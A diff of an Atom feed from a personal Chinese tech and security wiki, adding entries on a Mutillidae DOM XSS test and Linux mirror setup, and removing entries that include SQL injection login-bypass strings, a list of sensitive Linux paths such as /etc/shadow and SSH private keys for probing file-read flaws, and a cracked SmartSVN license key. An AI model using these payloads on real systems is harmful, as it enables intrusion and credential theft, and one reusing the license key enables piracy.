@@ -4,13 +4,126 @@
   <title><![CDATA[lonelyorWiki]]></title>
   <link href="http://www.lonelyor.org/lonelyorWiki/atom.xml" rel="self"/>
   <link href="http://www.lonelyor.org/lonelyorWiki/"/>
-  <updated>2019-06-12T11:11:15+08:00</updated>
+  <updated>2019-06-14T15:22:33+08:00</updated>
   <id>http://www.lonelyor.org/lonelyorWiki/</id>
   <author>
     <name><![CDATA[]]></name>
     
   </author>
   <generator uri="http://www.mweb.im/">MWeb</generator>
+  
+  <entry>
+    <title type="html"><![CDATA[Mutillidae 遇到的一个奇怪问题]]></title>
+    <link href="http://www.lonelyor.org/lonelyorWiki/15642124072307.html"/>
+    <updated>2019-07-27T15:26:47+08:00</updated>
+    <id>http://www.lonelyor.org/lonelyorWiki/15642124072307.html</id>
+    <content type="html"><![CDATA[
+<p>在进行 dom 型 xss 测试的时候，发现 payload 中输入 x 或 y 会弹窗，其他字母不弹窗。具体如下图所示。<br/>
+<code>&lt;img src=1 onerror=alert(z)&gt;</code><br/>
+<figure><img src="media/15642124072307/15642124281235.jpg" alt="" style="width:1017px;"/></figure></p>
+<img src=1 onerror=alert(x)>
+<p><figure><img src="media/15642124072307/15642124904179.jpg" alt="" style="width:774px;"/></figure></p>
+<img src=1 onerror=alert(y)>
+<p><figure><img src="media/15642124072307/15642125078089.jpg" alt="" style="width:769px;"/></figure></p>
+
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[manjaro更改国内源操作]]></title>
+    <link href="http://www.lonelyor.org/lonelyorWiki/15641083818915.html"/>
+    <updated>2019-07-26T10:33:01+08:00</updated>
+    <id>http://www.lonelyor.org/lonelyorWiki/15641083818915.html</id>
+    <content type="html"><![CDATA[
+<p>1、排序并增加中文rank源<br/>
+<code>sudo pacman-mirrors -i -c China -m rank</code><br/>
+选择喜欢的就行，不知道就全选好了。</p>
+
+<p>2、添加 archlinuxcn（archlinux 可用）<br/>
+修改<code>/etc/pacman.conf</code>文件，在文件后添加如下语句：</p>
+
+<pre class="line-numbers"><code class="language-text">[archlinuxcn]
+SigLevel = Optional TrustedOnly
+Server = https://mirrors.ustc.edu.cn/archlinuxcn/$arch
+</code></pre>
+
+<p>导入GPG Key<br/>
+<code>sudo pacman -Syy &amp;&amp; sudo pacman -S archlinuxcn-keyring</code></p>
+
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[kali 下更新软件时报错，说下列签名无效的解决办法]]></title>
+    <link href="http://www.lonelyor.org/lonelyorWiki/15640473747565.html"/>
+    <updated>2019-07-25T17:36:14+08:00</updated>
+    <id>http://www.lonelyor.org/lonelyorWiki/15640473747565.html</id>
+    <content type="html"><![CDATA[
+<p>解决办法就是重新获取下签名key </p>
+
+<p>wget -q -O - <a href="https://archive.kali.org/archive-key.asc">https://archive.kali.org/archive-key.asc</a> | sudo apt-key add</p>
+
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[Archiso]]></title>
+    <link href="http://www.lonelyor.org/lonelyorWiki/15638711886127.html"/>
+    <updated>2019-07-23T16:39:48+08:00</updated>
+    <id>http://www.lonelyor.org/lonelyorWiki/15638711886127.html</id>
+    <content type="html"><![CDATA[
+<p>参考官方文档，自制 archlinux 可启动镜像。这样就可以拥有自己的 linux 发行版了。</p>
+
+<p><a href="https://wiki.archlinux.org/index.php/Archiso">https://wiki.archlinux.org/index.php/Archiso</a></p>
+
+<p>修改 pacman.conf，添加自定义存储库<br/>
+<figure><img src="media/15638711886127/15638731637993.jpg" alt="" style="width:460px;"/></figure></p>
+
+<p>将 customrepo 的内容改为 archlinuxcn</p>
+
+<pre class="line-numbers"><code class="language-text">#[customrepo]
+SigLevel = Optional TrustAll
+Server = file:///home/user/customrepo/$arch
+</code></pre>
+
+<p>改为</p>
+
+<pre class="line-numbers"><code class="language-text">#[archlinuxcn]
+SigLevel = Optional TrustAll
+Server = https://mirrors.ustc.edu.cn/archlinuxcn/$arch
+</code></pre>
+
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[archlinux 安装 vmtools 遇到坑了怎么办]]></title>
+    <link href="http://www.lonelyor.org/lonelyorWiki/15611953556975.html"/>
+    <updated>2019-06-22T17:22:35+08:00</updated>
+    <id>http://www.lonelyor.org/lonelyorWiki/15611953556975.html</id>
+    <content type="html"><![CDATA[
+<p>使用这个脚本即可：<a href="https://github.com/rasa/vmware-tools-patches">https://github.com/rasa/vmware-tools-patches</a></p>
+
+<pre class="line-numbers"><code class="language-text">$ git clone https://github.com/rasa/vmware-tools-patches.git
+$ cd vmware-tools-patches
+$ ./patched-open-vm-tools.sh
+</code></pre>
+
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[linux 在终端中打开图形化文件管理器]]></title>
+    <link href="http://www.lonelyor.org/lonelyorWiki/15605030813483.html"/>
+    <updated>2019-06-14T17:04:41+08:00</updated>
+    <id>http://www.lonelyor.org/lonelyorWiki/15605030813483.html</id>
+    <content type="html"><![CDATA[
+<p>xdg-open ./ 用图形化文件管理器打开当前文件夹</p>
+
+<p>xdg-open &quot;dir&quot; 打开任意路径</p>
+
+]]></content>
+  </entry>
   
   <entry>
     <title type="html"><![CDATA[Docker for Mac 卡在 "is starting"]]></title>
@@ -737,405 +850,6 @@ Committed revision 1135.
 3、LTE／4G 伪基站＋GSM 中间人攻击实现手机短信验证码攻击（相关安全事件可见&quot;这下一无所有了&quot;：<a href="http://netsecurity.51cto.com/art/201808/580812.htm%EF%BC%89">http://netsecurity.51cto.com/art/201808/580812.htm）</a><br/>
 4、验证码流程绕过（空验证码、返回包含验证码、验证码固定、验证码前端校验、验证流程有误）<br/>
 5、人工打码平台</p>
-
-]]></content>
-  </entry>
-  
-  <entry>
-    <title type="html"><![CDATA[万能密码]]></title>
-    <link href="http://www.lonelyor.org/lonelyorWiki/15585815946395.html"/>
-    <updated>2019-05-23T11:19:54+08:00</updated>
-    <id>http://www.lonelyor.org/lonelyorWiki/15585815946395.html</id>
-    <content type="html"><![CDATA[
-<blockquote>
-<p>内容收集自网络，是否有效并未验证<br/>
-原文链接：<a href="https://blog.csdn.net/u012804180/article/details/51932863">asp、aspx、php、jsp万能密码大全</a></p>
-</blockquote>
-
-<p>-------asp万能密码 <br/>
-      &#39;or&#39;=&#39;or&#39;</p>
-
-<p>--------aspx万能密码<br/>
-   1： &quot;or &quot;a&quot;=&quot;a<br/>
-   2： &#39;)or(&#39;a&#39;=&#39;a<br/>
-   3：or 1=1--<br/>
-   4：&#39;or 1=1--<br/>
-   5：a&#39;or&#39; 1=1--<br/>
-   6： &quot;or 1=1--<br/>
-   7：&#39;or&#39;a&#39;=&#39;a<br/>
-   8： &quot;or&quot;=&quot;a&#39;=&#39;a<br/>
-   9：&#39;or&#39;&#39;=&#39;<br/>
-   10：&#39;or&#39;=&#39;or&#39;<br/>
-   11: 1 or &#39;1&#39;=&#39;1&#39;=1<br/>
-   12: 1 or &#39;1&#39;=&#39;1&#39; or 1=1<br/>
-   13: &#39;OR 1=1%00<br/>
-   14: &quot;or 1=1%00<br/>
-   15: &#39;xor<br/>
-   16: 新型万能登陆密码</p>
-
-<p>   用户名 &#39; UNION Select 1,1,1 FROM admin Where &#39;&#39;=&#39; （替换表名admin）<br/>
-   密码 1<br/>
-   Username=-1%cf&#39; union select 1,1,1 as password,1,1,1 %23<br/>
-   Password=1</p>
-
-<p>   17..admin&#39; or &#39;a&#39;=&#39;a 密码随便<br/>
- <br/>
---------PHP万能密码<br/>
-   &#39;or&#39;=&#39;or&#39;<br/>
-   &#39;or 1=1/*  字符型 GPC是否开都可以使用</p>
-
-<p>   User: something<br/>
-   Pass: &#39; OR &#39;1&#39;=&#39;1</p>
-
-<p> <br/>
---------jsp 万能密码<br/>
-   1&#39;or&#39;1&#39;=&#39;1<br/>
-   admin&#39; OR 1=1/*<br/>
- <br/>
-   用户名：admin    系统存在这个用户的时候 才用得上<br/>
-   <br/>
-   密码：1&#39;or&#39;1&#39;=&#39;1</p>
-
-<hr/>
-
-<p>作者：xss_01 <br/>
-来源：CSDN <br/>
-原文：<a href="https://blog.csdn.net/u012804180/article/details/51932863">https://blog.csdn.net/u012804180/article/details/51932863</a> <br/>
-版权声明：本文为博主原创文章，转载请附上博文链接！</p>
-
-]]></content>
-  </entry>
-  
-  <entry>
-    <title type="html"><![CDATA[家思]]></title>
-    <link href="http://www.lonelyor.org/lonelyorWiki/15578813198735.html"/>
-    <updated>2019-05-15T08:48:39+08:00</updated>
-    <id>http://www.lonelyor.org/lonelyorWiki/15578813198735.html</id>
-    <content type="html"><![CDATA[
-<p>慈母手中线，游子身上衣。临行密密缝，易恐迟迟归。谁言寸草心，报得三春晖。</p>
-
-<p>少时不知家可贵，为离故乡，奔波十年方始回。年轻时讨厌家人的管教，只想远离家乡，一个人在外求学四年，虽多遇不平之事，但那时仍觉家无温暖，家人也依然还是喜欢絮絮叨叨。后过三年，每逢春节回家，倍感家人渐渐衰老，虽父亲染发，但依然掩饰不了已经满头白发的事实。不是不爱家，只是说不出口。最怕爱将至而时已晚，最恨情已深而口难开。</p>
-
-<p>来深方半月时间，然小病却接连不断。上一次生病的记忆还是三年前的了。人总是越脆弱的时候越想家，越孤单的时候越想家人。时光将自己雕琢成了大人，将家人雕琢成了老人，将情越琢越深，将思念越琢越纯。</p>
-
-<p>不知是因为什么原因，无论心态还是身体都感觉像灌注了水泥，渐渐凝滞。也许是懒惰阻碍了思考，也许是勤奋想得太多，也许是白日梦空白了一切，也许是现实的光芒点缀了头顶的星空。眼前尽是空白，转瞬又光怪陆离，张口不知道在怎样的胡言乱语，缄默才是最好的表达吧。</p>
-
-]]></content>
-  </entry>
-  
-  <entry>
-    <title type="html"><![CDATA[linux 敏感目录]]></title>
-    <link href="http://www.lonelyor.org/lonelyorWiki/15577346001597.html"/>
-    <updated>2019-05-13T16:03:20+08:00</updated>
-    <id>http://www.lonelyor.org/lonelyorWiki/15577346001597.html</id>
-    <content type="html"><![CDATA[
-<p>Linux敏感目录，网站存在包含漏洞、任意文件读取漏洞等，权限允许的条件下，放在burp里面批量跑。</p>
-
-<p>/apache/apache/conf/httpd.conf<br/>
-/apache/apache2/conf/httpd.conf<br/>
-/apache/php/php.ini<br/>
-/bin/php.ini<br/>
-/etc/anacrontab<br/>
-/etc/apache/apache.conf<br/>
-/etc/apache/httpd.conf<br/>
-/etc/apache2/apache.conf<br/>
-/etc/apache2/httpd.conf<br/>
-/etc/apache2/sites-available/default<br/>
-/etc/apache2/vhosts.d/00_default_vhost.conf<br/>
-/etc/at.allow<br/>
-/etc/at.deny<br/>
-/etc/cron.allow<br/>
-/etc/cron.deny<br/>
-/etc/crontab<br/>
-/etc/fstab<br/>
-/etc/host.conf<br/>
-/etc/httpd/conf.d/httpd.conf<br/>
-/etc/httpd/conf.d/php.conf<br/>
-/etc/httpd/conf/httpd.conf<br/>
-/etc/httpd/htdocs/index.html<br/>
-/etc/httpd/htdocs/index.php<br/>
-/etc/httpd/logs/access.log<br/>
-/etc/httpd/logs/access_log<br/>
-/etc/httpd/logs/error.log<br/>
-/etc/httpd/logs/error_log<br/>
-/etc/httpd/php.ini<br/>
-/etc/init.d/httpd<br/>
-/etc/init.d/mysql<br/>
-/etc/ld.so.conf<br/>
-/etc/motd<br/>
-/etc/my.cnf<br/>
-/etc/mysql/my.cnf<br/>
-/etc/mysql/my.cnf<br/>
-/etc/network/interfaces<br/>
-/etc/networks<br/>
-/etc/passwd<br/>
-/etc/php.ini<br/>
-/etc/php/apache/php.ini<br/>
-/etc/php/apache2/php.ini<br/>
-/etc/php/cgi/php.ini<br/>
-/etc/php/php.ini<br/>
-/etc/php/php4/php.ini<br/>
-/etc/php4.4/fcgi/php.ini<br/>
-/etc/php4/apache/php.ini<br/>
-/etc/php4/apache2/php.ini<br/>
-/etc/php4/cgi/php.ini<br/>
-/etc/php5/apache/php.ini<br/>
-/etc/php5/apache2/php.ini<br/>
-/etc/php5/cgi/php.ini<br/>
-/etc/phpmyadmin/config.inc.php<br/>
-/etc/resolv.conf<br/>
-/etc/shadow<br/>
-/etc/ssh/sshd_config<br/>
-/etc/ssh/sshd_config<br/>
-/etc/ssh/ssh_config<br/>
-/etc/ssh/ssh_config<br/>
-/etc/ssh/ssh_host_dsa_key<br/>
-/etc/ssh/ssh_host_dsa_key<br/>
-/etc/ssh/ssh_host_dsa_key.pub<br/>
-/etc/ssh/ssh_host_dsa_key.pub<br/>
-/etc/ssh/ssh_host_key<br/>
-/etc/ssh/ssh_host_key<br/>
-/etc/ssh/ssh_host_key.pub<br/>
-/etc/ssh/ssh_host_key.pub<br/>
-/etc/ssh/ssh_host_rsa_key<br/>
-/etc/ssh/ssh_host_rsa_key<br/>
-/etc/ssh/ssh_host_rsa_key.pub<br/>
-/etc/ssh/ssh_host_rsa_key.pub<br/>
-/etc/sysconfig/network<br/>
-/etc/sysconfig/network<br/>
-/home/apache/conf/httpd.conf<br/>
-/home/apache2/conf/httpd.conf<br/>
-/home/bin/stable/apache/php.ini<br/>
-/home2/bin/stable/apache/php.ini<br/>
-/NetServer/bin/stable/apache/php.ini<br/>
-/opt/www/conf/httpd.conf<br/>
-/opt/www/htdocs/index.html<br/>
-/opt/www/htdocs/index.php<br/>
-/opt/xampp/etc/php.ini<br/>
-/PHP/php.ini<br/>
-/php/php.ini<br/>
-/php4/php.ini<br/>
-/php5/php.ini<br/>
-/root/.atftp_history<br/>
-/root/.bashrc<br/>
-/root/.bash_history<br/>
-/root/.mysql_history<br/>
-/root/.nano_history<br/>
-/root/.php_history<br/>
-/root/.profile<br/>
-/root/.ssh/authorized_keys<br/>
-/root/.ssh/identity<br/>
-/root/.ssh/identity.pub<br/>
-/root/.ssh/id_dsa<br/>
-/root/.ssh/id_dsa.pub<br/>
-/root/.ssh/id_rsa<br/>
-/root/.ssh/id_rsa.pub<br/>
-/root/anaconda-ks.cfg<br/>
-/tmp/apache/htdocs/index.html<br/>
-/tmp/apache/htdocs/index.php<br/>
-/usr/lib/php.ini<br/>
-/usr/lib/php/php.ini<br/>
-/usr/local/apache/conf/httpd.conf<br/>
-/usr/local/apache/conf/php.ini<br/>
-/usr/local/apache/htdocs/index.html<br/>
-/usr/local/apache/htdocs/index.php<br/>
-/usr/local/apache/logs/access.log<br/>
-/usr/local/apache/logs/access_log<br/>
-/usr/local/apache/logs/access_logaccess_log.old<br/>
-/usr/local/apache/logs/error.log<br/>
-/usr/local/apache/logs/error_log<br/>
-/usr/local/apache/logs/error_logerror_log.old<br/>
-/usr/local/apache2/conf/httpd.conf<br/>
-/usr/local/apache2/conf/php.ini<br/>
-/usr/local/apache2/htdocs/index.html<br/>
-/usr/local/apache2/htdocs/index.php<br/>
-/usr/local/cpanel/logs<br/>
-/usr/local/cpanel/logs/access_log<br/>
-/usr/local/cpanel/logs/error_log<br/>
-/usr/local/cpanel/logs/license_log<br/>
-/usr/local/cpanel/logs/login_log<br/>
-/usr/local/cpanel/logs/stats_log<br/>
-/usr/local/cpanel/logs/stats_log<br/>
-/usr/local/etc/php.ini<br/>
-/usr/local/httpd/conf/httpd.conf<br/>
-/usr/local/httpd2.2/htdocs/index.html<br/>
-/usr/local/httpd2.2/htdocs/index.php<br/>
-/usr/local/lib/php.ini<br/>
-/usr/local/mysql/bin/mysql<br/>
-/usr/local/mysql/my.cnf<br/>
-/usr/local/php/lib/php.ini<br/>
-/usr/local/php4/lib/php.ini<br/>
-/usr/local/php4/lib/php.ini<br/>
-/usr/local/php4/php.ini<br/>
-/usr/local/php5/etc/php.ini<br/>
-/usr/local/php5/lib/php.ini<br/>
-/usr/local/php5/php5.ini<br/>
-/usr/local/share/examples/php/php.ini<br/>
-/usr/local/share/examples/php4/php.ini<br/>
-/usr/local/tomcat5527/bin/version.sh<br/>
-/usr/local/Zend/etc/php.ini<br/>
-/usr/share/tomcat6/bin/startup.sh<br/>
-/usr/tomcat6/bin/startup.sh<br/>
-/var/apache2/config.inc<br/>
-/var/httpd/conf/httpd.conf<br/>
-/var/httpd/conf/php.ini<br/>
-/var/httpd/conf/php.ini<br/>
-/var/httpd/htdocs/index.html<br/>
-/var/httpd/htdocs/index.php<br/>
-/var/lib/mysql/my.cnf<br/>
-/var/lib/mysql/mysql/user.MYD<br/>
-/var/local/www/conf/httpd.conf<br/>
-/var/local/www/conf/php.ini<br/>
-/var/log/access.log<br/>
-/var/log/access_log<br/>
-/var/log/apache/access.log<br/>
-/var/log/apache/access_log<br/>
-/var/log/apache/error.log<br/>
-/var/log/apache/error_log<br/>
-/var/log/apache2/access.log<br/>
-/var/log/apache2/access_log<br/>
-/var/log/apache2/error.log<br/>
-/var/log/apache2/error_log<br/>
-/var/log/error.log<br/>
-/var/log/error_log<br/>
-/var/log/mysql.log<br/>
-/var/log/mysql/mysql-bin.log<br/>
-/var/log/mysql/mysql-slow.log<br/>
-/var/log/mysql/mysql.log<br/>
-/var/log/mysqlderror.log<br/>
-/var/mail/root<br/>
-/var/mysql.log<br/>
-/var/spool/cron/crontabs/root<br/>
-/var/spool/mail/root<br/>
-/var/www/conf/httpd.conf<br/>
-/var/www/htdocs/index.html<br/>
-/var/www/htdocs/index.php<br/>
-/var/www/index.html<br/>
-/var/www/index.php<br/>
-/var/www/logs/access.log<br/>
-/var/www/logs/access_log<br/>
-/var/www/logs/error.log<br/>
-/var/www/logs/error_log<br/>
-/web/conf/php.ini<br/>
-/www/conf/httpd.conf<br/>
-/www/htdocs/index.html<br/>
-/www/htdocs/index.php<br/>
-/www/php/php.ini<br/>
-/www/php4/php.ini<br/>
-/www/php5/php.ini<br/>
-/xampp/apache/bin/php.ini<br/>
-/xampp/apache/conf/httpd.conf<br/>
-root/.ssh/authorized_keys<br/>
-root/.ssh/identity<br/>
-root/.ssh/identity.pub<br/>
-root/.ssh/id_dsa<br/>
-root/.ssh/id_dsa.pub<br/>
-root/.ssh/id_rsa<br/>
-root/.ssh/id_rsa.pub</p>
-
-]]></content>
-  </entry>
-  
-  <entry>
-    <title type="html"><![CDATA[Mac 上的 svnGUI 工具：smartsvn 安装、激活和使用]]></title>
-    <link href="http://www.lonelyor.org/lonelyorWiki/15573021402615.html"/>
-    <updated>2019-05-08T15:55:40+08:00</updated>
-    <id>http://www.lonelyor.org/lonelyorWiki/15573021402615.html</id>
-    <content type="html"><![CDATA[
-<p>smartsvn 是 mac 上的 svn 客户端，svn 是类似 git 的版本控制工具。</p>
-
-<p>1、下载 smartsvn <a href="http://www.smartsvn.com/download">srmatsvn 官网下载地址</a><br/>
-2、在任意目录下新建文件 smartsvn.license，然后写入以下内容：</p>
-
-<pre class="line-numbers"><code class="language-text">Name=csdn  
-Address=1337 iNViSiBLE Str.  
-Email=admin@csdn.net  
-FreeUpdatesUntil=2099-09-26  
-LicenseCount=1337  
-Addon-xMerge=true  
-Addon-API=true  
-Enterprise=true  
-Key=4kl-&lt;Zqcm-iUF7I-IVmYG-XAyvv-KYRoC-xlgsv-sSBds-VAnP6  
-</code></pre>
-
-<p>3、在安装软件需要导入 license 时选择上述文件或者安装软件后在菜单栏的 help-register 中导入密钥文件即可激活软件。</p>
-
-<p>4、点击菜单栏的project-checkout，添加远程目录，然后输入认证信息，输入本地目录信息，即可挂载远程目录到本地。</p>
-
-<p>5、若认证出错，则点击菜单栏的 SmartSVN-preferences，然后选择 Authentication，使用 delete 删除之前存储的认证信息，然后重新 checkout 即可。</p>
-
-<h1 id="toc_0">Mac 终端下 svn 常用命令</h1>
-
-<p>Mac 可以不用安装 svnGUI 而直接使用命令进行 svn 操作，常见svn 命令如下：<br/>
-svn help 查看命令帮助<br/>
-svn checkout xxx 拉取远程目录到本地<br/>
-svn add file 往版本库中添加新文件</p>
-
-<p>更多常用命令可参考：<a href="https://www.cnblogs.com/luckythan/p/4478706.html">Mac终端下svn常用命令</a></p>
-
-<blockquote>
-<p>通过命令行操作进行认证后，其认证信息存储在 <code>~/.subversion/auth/svn.simple</code>目录下，若认证失败，需要在此目录下情况认证信息后重新进行认证。</p>
-</blockquote>
-
-]]></content>
-  </entry>
-  
-  <entry>
-    <title type="html"><![CDATA[c 语言中变量前面加`*`表示什么？如`*`p]]></title>
-    <link href="http://www.lonelyor.org/lonelyorWiki/15572001451538.html"/>
-    <updated>2019-05-07T11:35:45+08:00</updated>
-    <id>http://www.lonelyor.org/lonelyorWiki/15572001451538.html</id>
-    <content type="html"><![CDATA[
-<p>*p的意思是：p是一个指针（即指向某一个区域的地址）<br/>
-如果前面加了修饰，就表示为那个类型的指针<br/>
-如：int *p;表示p是一个整型指针，指向一个整型变量的地址</p>
-
-]]></content>
-  </entry>
-  
-  <entry>
-    <title type="html"><![CDATA[CEO、COO、CFO、CIO、CTO、CMO的中文是什么?]]></title>
-    <link href="http://www.lonelyor.org/lonelyorWiki/15554899648347.html"/>
-    <updated>2019-04-17T16:32:44+08:00</updated>
-    <id>http://www.lonelyor.org/lonelyorWiki/15554899648347.html</id>
-    <content type="html"><![CDATA[
-<ol>
-<li>CEO：首席执行官</li>
-</ol>
-
-<p>首席执行官（Chief Executive Officer，缩写CEO）是在一个企业中负责日常事务的最高行政官员，主司企业行政事务，又称作司政、行政总裁、总经理或最高执行长。</p>
-
-<ol>
-<li>COO：首席运营官</li>
-</ol>
-
-<p>首席运营官（Chief Operating Officer，缩写COO，营运长），就是制定企业长远战略，督导各分公司总经理执行工作的官。主要是负责公司的日常运营，辅助CEO的工作。对CEO负责，负责企业的运营管理。COO在某些公司中同时任职总裁，但他们通常是常务或资深的副总裁。</p>
-
-<ol>
-<li>CFO：首席财务官</li>
-</ol>
-
-<p>首席财务官（Chief<br/>
-Financial<br/>
-Officer）是企业治理结构发展到一个新阶段的必然产物。没有首席财务官的治理结构不是现代意义上完善的治理结构。从这一层面上看，中国构造治理结构也应设立CFO之类的职位。当然，从本质上讲，CFO在现代治理结构中的真正含义，不是其名称的改变、官位的授予，而是其职责权限的取得，在管理中作用的真正发挥。</p>
-
-<ol>
-<li>CIO：首席信息官</li>
-</ol>
-
-<p>首席信息官（Chief Information Officer）中文意思是首席信息官或信息主管，是负责一个公司信息技术和系统所有领域的高级官员。是一个比较新的职位，目前只有在一些全球500强的大企业才设立职位。</p>
-
-<ol>
-<li>CTO：首席技术官</li>
-</ol>
-
-<p>首席技术官（Chief Technology Officer），即企业内负责技术的最高负责人。这个名称在1980年代从美国开始时兴起于做很多研究的大公司，如General Electric，AT&amp;T，ALCOA，主要责任是将科学研究成果成为盈利产品。</p>
-
-<ol>
-<li>CMO：首席营销官</li>
-</ol>
-
-<p>首席营销官（Chief Marketing Officer）是指企业中负责市场运营工作的高级管理人员，又称作市场部经理、营销总监。主要负责在企业中对营销思想进行定位；把握市场机会，制定市场营销战略和实施计划，完成企业的营销目标；协调企业内外部关系，对企业市场营销战略计划的执行进行监督和控制；负责企业营销组织建设与激励工作。</p>
 
 ]]></content>
   </entry>
